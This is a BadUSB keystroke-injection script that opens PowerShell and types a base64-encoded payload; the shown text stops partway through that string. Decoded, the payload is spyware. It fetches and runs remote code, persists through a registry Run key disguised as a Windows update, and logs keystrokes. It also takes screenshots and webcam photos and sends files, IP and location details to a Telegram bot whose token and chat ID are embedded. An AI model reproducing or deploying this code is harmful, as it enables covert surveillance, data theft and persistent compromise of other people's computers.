REM Title      :
REM Description:
REM Author     :
REM Version    :
REM Generated by REDD's Encrypted Payload Generator
REM - It is highly suggested you adjust the DELAYS for your use.
DELAY 2000
GUI r
DELAY 200
STRING powershell
DELAY 500
ENTER
DELAY 500
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo DQo8IyAgDQpCQURVU0IgQ09NTUFORFM6DQogICAgIyBFeGVjdXRlIA0KICAgIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWZpbGUgdGhpc19maWxlLnBzMQ0KICAgICNFeGVjdXRlIHNjcmlwdCBmcm9tIGdpdGh1Yg0KICAgIGlleCAoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWxleGZyYW5jb3cvYmFkdXNiX2JvdG5ldC9tYXN0ZXIvcG9jLnBzMScpKQ0KICAgIFBvd2VyU2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgaWV4ICgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbGV4ZnJhbmNvdy9iYWR1c2JfYm90bmV0L21hc3Rlci9wb2MucHMxJykpDQogICAgUG93ZXJTaGVsbC5leGUgLVdpbmRvd1N0eWxlIE1pbmltaXplZCAtQ29tbWFuZCBpZXggKChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsZXhmcmFuY293L2JhZHVzYl9ib3RuZXQvbWFzdGVyL3BvYy5wczEnKSkNClJFR0VESVQ6DQoJcmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3Ygd2luZG93c1VwZGF0ZSAvdCBSRUdfU1ogL2QgInBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcd2luZG93c1VwZGF0ZS5wczEiCQ0KICAgIGh0dHBzOi8vd3d3LmFrYWRpYS5jb20vc2VydmljZXMvd2luZG93c19yZWdpc3RyeS5odG1sIA0KQk9UIFRFTEVHUkFNOg0KICAgIGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzM0NDU3NTY4L2hvdy10by1zaG93LW9wdGlvbnMtaW4tdGVsZWdyYW0tYm90DQoJIz4NCg0KDQojIyMjIyMjIyMjIyMNCiMjIENPTkZJRyAjIw0KIyMjIyMjIyMjIyMjDQoNCiRCb3RUb2tlbiA9ICI2NzY0ODM2MjE5OkFBR2xZbFRNUkRlLXo4QjFpZDk4Tk9pNnZ2MHE3dkdfRERNIg0KJENoYXRJRCA9ICctNDA1NDk3OTAwNicNCiRnaXRodWJTY3JpcHQgPSAnaHR0cHM6Ly9naXRodWIuY29tL01hckthbGlHRy9iYWR1c2JfYm90bmV0L2Jsb2IvbWFzdGVyL3BvYy5wczEnDQoNCg0KIyMjIyMjIyMjIyMjIyMjDQojIyBGVU5DVElPTlMgIyMNCiMjIyMjIyMjIyMjIyMjIw0KDQpmdW5jdGlvbiB0dXJuT2ZmU2NyZWVuIHsNCiAgICAjIFNvdXJjZTogaHR0cDovL3d3dy5wb3dlcnNoZWxsbWFnYXppbmUuY29tLzIwMTMvMDcvMTgvcHN0aXAtaG93LXRvLXN3aXRjaC1vZmYtZGlzcGxheS13aXRoLXBvd2Vyc2hlbGwvDQoNCiAgICAjIFR1cm4gZGlzcGxheSBvZmYgYnkgY2FsbGluZyBXaW5kb3dzQVBJLg0KIA0KICAgICMgU2VuZE1lc3NhZ2UoSFdORF9CUk9BRENBU1QsV01fU1lTQ09NTUFORCwgU0NfTU9OSVRPUlBPV0VSLCBQT1dFUl9PRkYpDQogICAgIyBIV05EX0JST0FEQ0FTVCAgMHhmZmZmDQogICAgIyBXTV9TWVNDT01NQU5EICAgMHgwMTEyDQogICAgIyBTQ19NT05JVE9SUE9XRVIgMHhmMTcwDQogICAgIyBQT1dFUl9PRkYgICAgICAgMHgwMDAyDQogDQogICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICcNCiAgICB1c2luZyBTeXN0ZW07DQogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KIA0KICAgIG5hbWVzcGFjZSBVdGlsaXRpZXMgew0KICAgICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgRGlzcGxheQ0KICAgICAgIHsNCiAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldDQogICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBTZW5kTWVzc2FnZSgNCiAgICAgICAgICAgICBJbnRQdHIgaFduZCwNCiAgICAgICAgICAgICBVSW50MzIgTXNnLA0KICAgICAgICAgICAgIEludFB0ciB3UGFyYW0sDQogICAgICAgICAgICAgSW50UHRyIGxQYXJhbQ0KICAgICAgICAgICk7DQogDQogICAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIFBvd2VyT2ZmICgpDQogICAgICAgICAgew0KICAgICAgICAgICAgIFNlbmRNZXNzYWdlKA0KICAgICAgICAgICAgICAgIChJbnRQdHIpMHhmZmZmLCAvLyBIV05EX0JST0FEQ0FTVA0KICAgICAgICAgICAgICAgIDB4MDExMiwgICAgICAgICAvLyBXTV9TWVNDT01NQU5EDQogICAgICAgICAgICAgICAgKEludFB0cikweGYxNzAsIC8vIFNDX01PTklUT1JQT1dFUg0KICAgICAgICAgICAgICAgIChJbnRQdHIpMHgwMDAyICAvLyBQT1dFUl9PRkYNCiAgICAgICAgICAgICApOw0KICAgICAgICAgIH0NCiAgICAgICB9DQogICAgfQ0KICAgICcNCg0KICAgIFtVdGlsaXRpZXMuRGlzcGxheV06OlBvd2VyT2ZmKCkNCn0NCg0KZnVuY3Rpb24gYmFja2Rvb3Igew0KICAgICAgICByZWcgZGVsZXRlIEhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiB3aW5kb3dzVXBkYXRlIC9mDQogICAgICAgIA0KICAgICAgICBTZW5kLU1lc3NhZ2UgIkRvd25sb2FkaW5nLi4iDQogICAgICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJGdpdGh1YlNjcmlwdCAtT3V0RmlsZSBDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1x3aW5kb3dzVXBkYXRlLnBzMQ0KDQogICAgICAgIFNlbmQtTWVzc2FnZSAiQWRkaW5nX3RvX3RoZV9yZWcuLiINCgkJcmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3Ygd2luZG93c1VwZGF0ZSAvdCBSRUdfU1ogL2QgInBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcd2luZG93c1VwZGF0ZS5wczEiDQoNCiAgICAgICAgIyBDaGVjayBiYWNrZG9vcg0KICAgICAgICAjJGNoZWNrQmFja2Rvb3IgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfU3RhcnR1cENvbW1hbmQgfCBTZWxlY3QtU3RyaW5nIHdpbmRvd3NVcGRhdGUNCiAgICAgICAgJGNoZWNrQmFja2Rvb3IgPSByZWcgcXVlcnkgSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIHwgU2VsZWN0LVN0cmluZyB3aW5kb3dzVXBkYXRlDQogICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRCb3RUb2tlbikvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0kKCRDaGF0SUQpJnRleHQ9JCgkY2hlY2tCYWNrZG9vcikiDQoJCQ0KICAgICAgICAjIEJhY2tkb29yIG9uIHN0YXJ0dXAgcHJvZ3JhbXMNCiAgICAgICAgJGNvbW1hbmQgPSBjbWQuZXhlIC9jICJwb3dlcnNoZWxsLmV4ZSAtd2luZG93c3R5bGUgaGlkZGVuIC1maWxlIEM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXHdpbmRvd3NVcGRhdGUucHMxIg0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZDokY29tbWFuZA0KfQ0KDQpmdW5jdGlvbiBzY3JlZW5zaG90IHsNCiAgICAgIFtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLkRyYXdpbmciKQ0KICAgICAgICBmdW5jdGlvbiBzY3JlZW5zaG90KFtEcmF3aW5nLlJlY3RhbmdsZV0kYm91bmRzLCAkcGF0aCkgew0KICAgICAgICAgICAkYm1wID0gTmV3LU9iamVjdCBEcmF3aW5nLkJpdG1hcCAkYm91bmRzLndpZHRoLCAkYm91bmRzLmhlaWdodA0KICAgICAgICAgICAkZ3JhcGhpY3MgPSBbRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkYm1wKQ0KDQogICAgICAgICAgICRncmFwaGljcy5Db3B5RnJvbVNjcmVlbigkYm91bmRzLkxvY2F0aW9uLCBbRHJhd2luZy5Qb2ludF06OkVtcHR5LCAkYm91bmRzLnNpemUpDQoNCiAgICAgICAgICAgJGJtcC5TYXZlKCRwYXRoKQ0KDQogICAgICAgICAgICRncmFwaGljcy5EaXNwb3NlKCkNCiAgICAgICAgICAgJGJtcC5EaXNwb3NlKCkNCiAgICAgICAgfQ0KICAgICAgICAkYm91bmRzID0gW0RyYXdpbmcuUmVjdGFuZ2xlXTo6RnJvbUxUUkIoMCwgMCwgMTkyMCwgMTA4MCkNCiAgICAgICAgc2NyZWVuc2hvdCAkYm91bmRzICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xzY3JlZW5zaG90LmpwZyINCn0NCg0KZnVuY3Rpb24gY2xlYW5BbGwgew0KICAgICMgUmVtb3ZlIHNjcmVlbnNob3RzDQogICAgU2VuZC1NZXNzYWdlICJEZWxldGluZ19zY3JlZW5zaG90cy4uIg0KICAgIFJlbW92ZS1JdGVtICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xzY3JlZW5zaG90LmpwZyINCiAgICAjIFJlbW92ZSBjVXJsDQogICAgU2VuZC1NZXNzYWdlICJEZWxldGluZ19jVVJMLi4iDQogICAgUmVtb3ZlLUl0ZW0gLVJlY3Vyc2UgIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcQXBwRGF0YVxMb2NhbFxUZW1wXDEiDQogICAgIyBSZW1vdmUgYmFja2Rvb3INCiAgICBTZW5kLU1lc3NhZ2UgIkRlbGV0aW5nX2JhY2tkb29yLi4iDQogICAgUmVtb3ZlLUl0ZW0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXHdpbmRvd3NVcGRhdGUucHMxIg0KICAgIHJlZyBkZWxldGUgSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IHdpbmRvd3NVcGRhdGUgL2YNCiAgICAjIFJlbW92ZSB3ZWJjYW0NCiAgICBTZW5kLU1lc3NhZ2UgIkRlbGV0aW5nX3dlYmNhbS4uIg0KICAgIFJlbW92ZS1JdGVtICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xDb21tYW5kQ2FtLmV4ZSINCiAgICAjIFJlbW92ZSBuZXRjYXQNCiAgICBTZW5kLU1lc3NhZ2UgIkRlbGV0aW5nX25ldGNhdC4uIg0KICAgIFJlbW92ZS1JdGVtIC1SZWN1cnNlICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xuYyINCiAgICBSZW1vdmUtSXRlbSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcbmMuemlwIg0KfQ0KDQpmdW5jdGlvbiBpbnN0YWxsQ3VybCB7DQogICAgJGN1cmwgPSAiQzpcVXNlcnNcIiArICRlbnY6dXNlcm5hbWUgKyAiXGFwcGRhdGFcbG9jYWxcdGVtcFwxXGN1cmwuZXhlIg0KICAgIGlmKCFbU3lzdGVtLklPLkZpbGVdOjpFeGlzdHMoJGN1cmwpKXsNCiAgICAgICAgIyBmaWxlIHdpdGggcGF0aCAkcGF0aCBkb2Vzbid0IGV4aXN0DQogICAgICAgICRydXRhID0gIkM6XFVzZXJzXCIgKyAkZW52OnVzZXJuYW1lICsgIlxhcHBkYXRhXGxvY2FsXHRlbXBcMSINCiAgICAgICAgJGN1cmxfemlwID0gJHJ1dGEgKyAiXGN1cmwuemlwIg0KICAgICAgICAkY3VybCA9ICRydXRhICsgIlwiICsgImN1cmwuZXhlIg0KICAgICAgICAkY3VybF9tb2QgPSAkcnV0YSArICJcIiArICJjdXJsX21vZC5leGUiDQogICAgICAgIGlmICggKFRlc3QtUGF0aCAkcnV0YSkgLWVxICRmYWxzZSkge21rZGlyICRydXRhfSBlbHNlIHt9DQogICAgICAgIGlmICggKFRlc3QtUGF0aCAkY3VybF9tb2QpIC1lcSAkZmFsc2UgKSB7JHdlYmNsaWVudCA9ICJzeXN0ZW0ubmV0LndlYmNsaWVudCIgOyAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCAkd2ViY2xpZW50IDsgJHdlYnJlcXVlc3QgPSAkd2ViY2xpZW50LkRvd25sb2FkRmlsZSgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2N5YmVydmFjYS9wc2JvdGVsZWdyYW0vbWFzdGVyL0Z1bmNpb25lcy9jdXJsLnppcCIsIiRjdXJsX3ppcCIpDQogICAgICAgIFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtJykgfCBPdXQtTnVsbA0KICAgICAgICBbU3lzdGVtLklPLkNvbXByZXNzaW9uLlppcEZpbGVdOjpFeHRyYWN0VG9EaXJlY3RvcnkoIiRjdXJsX3ppcCIsIiRydXRhIikgfCBPdXQtTnVsbA0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkY3VybA0KICAgIH0NCiAgICAjIGVsc2UgY3VybCBleGlzdA0KICAgIHJldHVybiAkY3VybCAgICANCn0NCg0KZnVuY3Rpb24gc2VuZFBob3RvIHsNCiAgICBTZW5kLU1lc3NhZ2UgIlNlbmRpbmcuLiINCiAgICAkdXJpID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiICsgJEJvdFRva2VuICsgIi9zZW5kUGhvdG8iDQogICAgJHBob3RvID0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXHNjcmVlbnNob3QuanBnIg0KICAgICRjdXJsID0gaW5zdGFsbEN1cmwNCiAgICAkYXJndW1lbmxpc3QgPSAkdXJpICsgJyAtRiBjaGF0X2lkPScgKyAiJENoYXRJRCIgKyAnIC1GIHBob3RvPUAnICsgJHBob3RvICArICcgLWsgJw0KICAgIFN0YXJ0LVByb2Nlc3MgJGN1cmwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbmxpc3QgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgIA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICBTZW5kLU1lc3NhZ2UgIkRlbGV0aW5nLi4iDQogICAgUmVtb3ZlLUl0ZW0gJHBob3RvDQogICAgIyYgJGN1cmwgLXMgLVggUE9TVCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIkQm90VG9rZW4iL3NlbmRQaG90byIgLUYgY2hhdF9pZD0kQ2hhdElEIC1GIHBob3RvPSJAJFNuYXBGaWxlIg0KfQ0KDQpmdW5jdGlvbiBTZW5kLU1lc3NhZ2UoJG1lc3NhZ2UpIHsNCiAgICAkdXJpID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiICsgJEJvdFRva2VuICsgIi9zZW5kTWVzc2FnZSINCiAgICAkY3VybCA9IGluc3RhbGxDdXJsDQogICAgJGFyZ3VtZW5saXN0ID0gJHVyaSArICcgLUYgY2hhdF9pZD0nICsgIiRDaGF0SUQiICsgJyAtRiB0ZXh0PScgKyAkbWVzc2FnZSAgKyAnIC1rICcNCiAgICBTdGFydC1Qcm9jZXNzICRjdXJsIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW5saXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4NCn0NCg0KZnVuY3Rpb24gaXBQdWJsaWMgew0KICAgICMkaXBQdWJsaWMgPSBJbnZva2UtUmVzdE1ldGhvZCBodHRwOi8vaXBpbmZvLmlvL2pzb24gfCBTZWxlY3QgLWV4cCBpcA0KICAgICRpcFB1YmxpYyA9IEludm9rZS1SZXN0TWV0aG9kIGh0dHA6Ly9pcGluZm8uaW8vanNvbiB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IGNpdHksIHJlZ2lvbiwgcG9zdGFsLCBpcA0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRCb3RUb2tlbikvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0kKCRDaGF0SUQpJnRleHQ9JCgkaXBQdWJsaWMpJnBhcnNlX21vZGU9aHRtbCINCn0NCg0KZnVuY3Rpb24gZG93bmxvYWQoJEZpbGVUb0Rvd25sb2FkKSB7DQogICAgJHVyaSA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90IiArICRCb3RUb2tlbiArICIvc2VuZERvY3VtZW50Ig0KICAgICRjdXJsID0gaW5zdGFsbEN1cmwNCiAgICAkYXJndW1lbmxpc3QgPSAkdXJpICsgJyAtRiBjaGF0X2lkPScgKyAiJENoYXRJRCIgKyAnIC1GIGRvY3VtZW50PUAnICsgJEZpbGVUb0Rvd25sb2FkICArICcgLWsgJw0KICAgIFN0YXJ0LVByb2Nlc3MgJGN1cmwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbmxpc3QgLVdpbmRvd1N0eWxlIEhpZGRlbg0KDQogICAgI2N1cmwgLUYgY2hhdF9pZD0iJENoYXRJRCIgLUYgZG9jdW1lbnQ9QCIkRmlsZVRvRG93bmxvYWQiIGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q8dG9rZW4+L3NlbmREb2N1bWVudA0KfQ0KDQpmdW5jdGlvbiBrZXlsb2dnZXIoJHNlY29uZHMpIHsNCiAgIyBSZXF1aXJlcyAtVmVyc2lvbiAyDQogICMgU2lnbmF0dXJlcyBmb3IgQVBJIENhbGxzDQogICRzaWduYXR1cmVzID0gQCcNCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0bywgRXhhY3RTcGVsbGluZz10cnVlKV0gDQpwdWJsaWMgc3RhdGljIGV4dGVybiBzaG9ydCBHZXRBc3luY0tleVN0YXRlKGludCB2aXJ0dWFsS2V5Q29kZSk7IA0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRLZXlib2FyZFN0YXRlKGJ5dGVbXSBrZXlzdGF0ZSk7DQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1hcFZpcnR1YWxLZXkodWludCB1Q29kZSwgaW50IHVNYXBUeXBlKTsNCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldDQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgVG9Vbmljb2RlKHVpbnQgd1ZpcnRLZXksIHVpbnQgd1NjYW5Db2RlLCBieXRlW10gbHBrZXlzdGF0ZSwgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlciBwd3N6QnVmZiwgaW50IGNjaEJ1ZmYsIHVpbnQgd0ZsYWdzKTsNCidADQoNCiAgJFBhdGggPSAiJGVudjp0ZW1wXGtleWxvZ2dlci50eHQiDQoNCiAgIyBsb2FkIHNpZ25hdHVyZXMgYW5kIG1ha2UgbWVtYmVycyBhdmFpbGFibGUNCiAgJEFQSSA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmVzIC1OYW1lICdXaW4zMicgLU5hbWVzcGFjZSBBUEkgLVBhc3NUaHJ1DQogICAgDQogICMgY3JlYXRlIG91dHB1dCBmaWxlDQogICRudWxsID0gTmV3LUl0ZW0gLVBhdGggJFBhdGggLUl0ZW1UeXBlIEZpbGUgLUZvcmNlDQoNCiAgdHJ5IHsNCiAgICBXcml0ZS1Ib3N0ICdSZWNvcmRpbmcuLicNCiAgICBTZW5kLU1lc3NhZ2UgJ1JlY29yZGluZy4uJw0KDQogICAgIyBjcmVhdGUgZW5kbGVzcyBsb29wLiBXaGVuIHVzZXIgcHJlc3NlcyBDVFJMK0MsIGZpbmFsbHktYmxvY2sNCiAgICAjIGV4ZWN1dGVzIGFuZCBzaG93cyB0aGUgY29sbGVjdGVkIGtleSBwcmVzc2VzDQogICAgJHRpbWVvdXQgPSBuZXctdGltZXNwYW4gLVNlY29uZHMgICR0aW1lDQogICAgJHN3ID0gW2RpYWdub3N0aWNzLnN0b3B3YXRjaF06OlN0YXJ0TmV3KCkNCiAgICB3aGlsZSAoJHN3LmVsYXBzZWQgLWx0ICR0aW1lb3V0KSB7DQogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDQwDQogICAgICANCiAgICAgICMgc2NhbiBhbGwgQVNDSUkgY29kZXMgYWJvdmUgOA0KICAgICAgZm9yICgkYXNjaWkgPSA5OyAkYXNjaWkgLWxlIDI1NDsgJGFzY2lpKyspIHsNCiAgICAgICAgIyBnZXQgY3VycmVudCBrZXkgc3RhdGUNCiAgICAgICAgJHN0YXRlID0gJEFQSTo6R2V0QXN5bmNLZXlTdGF0ZSgkYXNjaWkpDQoNCiAgICAgICAgIyBpcyBrZXkgcHJlc3NlZD8NCiAgICAgICAgaWYgKCRzdGF0ZSAtZXEgLTMyNzY3KSB7DQogICAgICAgICAgJG51bGwgPSBbY29uc29sZV06OkNhcHNMb2NrDQoNCiAgICAgICAgICAjIHRyYW5zbGF0ZSBzY2FuIGNvZGUgdG8gcmVhbCBjb2RlDQogICAgICAgICAgJHZpcnR1YWxLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5KCRhc2NpaSwgMykNCg0KICAgICAgICAgICMgZ2V0IGtleWJvYXJkIHN0YXRlIGZvciB2aXJ0dWFsIGtleXMNCiAgICAgICAgICAka2JzdGF0ZSA9IE5ldy1PYmplY3QgQnl0ZVtdIDI1Ng0KICAgICAgICAgICRjaGVja2tic3RhdGUgPSAkQVBJOjpHZXRLZXlib2FyZFN0YXRlKCRrYnN0YXRlKQ0KDQogICAgICAgICAgIyBwcmVwYXJlIGEgU3RyaW5nQnVpbGRlciB0byByZWNlaXZlIGlucHV0IGtleQ0KICAgICAgICAgICRteWNoYXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyDQoNCiAgICAgICAgICAjIHRyYW5zbGF0ZSB2aXJ0dWFsIGtleQ0KICAgICAgICAgICRzdWNjZXNzID0gJEFQSTo6VG9Vbmljb2RlKCRhc2NpaSwgJHZpcnR1YWxLZXksICRrYnN0YXRlLCAkbXljaGFyLCAkbXljaGFyLkNhcGFjaXR5LCAwKQ0KDQoNCiAgICAgICAgICBpZiAoJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgICMgYWRkIGtleSB0byBsb2dnZXIgZmlsZQ0KICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6QXBwZW5kQWxsVGV4dCgkUGF0aCwgJG15Y2hhciwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZSkgDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgZmluYWxseSB7DQogICAgIyBvcGVuIGxvZ2dlciBmaWxlIGluIE5vdGVwYWQgLSBPbmx5IGZvciB0ZXN0DQogICAgI25vdGVwYWQgJFBhdGgNCg0KICAgIFdyaXRlLUhvc3QgIkRvd25sb2FkaW5nIGtleWxvZ2dlciBmaWxlLi4iDQogICAgU2VuZC1NZXNzYWdlICdEb3dubG9hZGluZy4uJw0KICAgIGRvd25sb2FkICRQYXRoDQoNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1DQogICAgV3JpdGUtSG9zdCAiRGVsZXRpbmcga2V5bG9nZ2VyIGZpbGUuLiINCiAgICBTZW5kLU1lc3NhZ2UgJ0RlbGV0aW5nLi4nDQogICAgUmVtb3ZlLUl0ZW0gJFBhdGgNCiAgfQ0KfQ0KDQpmdW5jdGlvbiB3ZWJjYW0gew0KICAgIFNlbmQtTWVzc2FnZSAiRG93bmxvYWRpbmcuLiINCiAgICAjIGh0dHBzOi8vYmF0Y2hsb2FmLndvcmRwcmVzcy5jb20vY29tbWFuZGNhbS8NCiAgICAkdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS90ZWRidXJrZS9Db21tYW5kQ2FtL3Jhdy9tYXN0ZXIvQ29tbWFuZENhbS5leGUiDQogICAgJG91dHBhdGggPSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcQ29tbWFuZENhbS5leGUiDQogICAgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMg0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cGF0aA0KDQogICAgU2VuZC1NZXNzYWdlICJUYWtpbmdfcGljdHVyZS4uIg0KICAgICRhcmdzID0gIi9maWxlbmFtZSBDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xpbWFnZS5qcGciDQogICAgU3RhcnQtUHJvY2VzcyAkb3V0cGF0aCAtQXJndW1lbnRMaXN0ICRhcmdzIC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1DQoNCiAgICBTZW5kLU1lc3NhZ2UgIlNlbmRpbmdfcGljdHVyZS4uIg0KICAgICR1cmkgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIgKyAkQm90VG9rZW4gKyAiL3NlbmRQaG90byINCiAgICAkcGhvdG8gPSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcaW1hZ2UuanBnIg0KICAgICRjdXJsID0gaW5zdGFsbEN1cmwNCiAgICAkYXJndW1lbmxpc3QgPSAkdXJpICsgJyAtRiBjaGF0X2lkPScgKyAiJENoYXRJRCIgKyAnIC1GIHBob3RvPUAnICsgJHBob3RvICArICcgLWsgJw0KICAgIFN0YXJ0LVByb2Nlc3MgJGN1cmwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbmxpc3QgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgIA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICBTZW5kLU1lc3NhZ2UgIkRlbGV0aW5nX3BpY3R1cmUuLiINCiAgICBSZW1vdmUtSXRlbSAkcGhvdG8NCiAgICBSZW1vdmUtSXRlbSAkb3V0cGF0aA0KfQ0KDQpmdW5jdGlvbiBtYWluQnJvd3NlciB7DQogICAgU2VuZC1NZXNzYWdlICJDaGVja2luZ19tYWluX2Jyb3dzZXJfb25fdGhlX3JlZy4uIg0KICAgICRtYWluQnJvd3NlciA9IHJlZyBxdWVyeSBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xTaGVsbFxBc3NvY2lhdGlvbnNcVXJsQXNzb2NpYXRpb25zXGh0dHBcVXNlckNob2ljZQ0KDQogICAgaWYgKCRtYWluQnJvd3NlciAtbWF0Y2ggJ2Nocm9tZScpIHsNCiAgICAgICAgU2VuZC1NZXNzYWdlICJDaHJvbWUhIg0KICAgICAgICAkY2hyb21lID0gIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNoc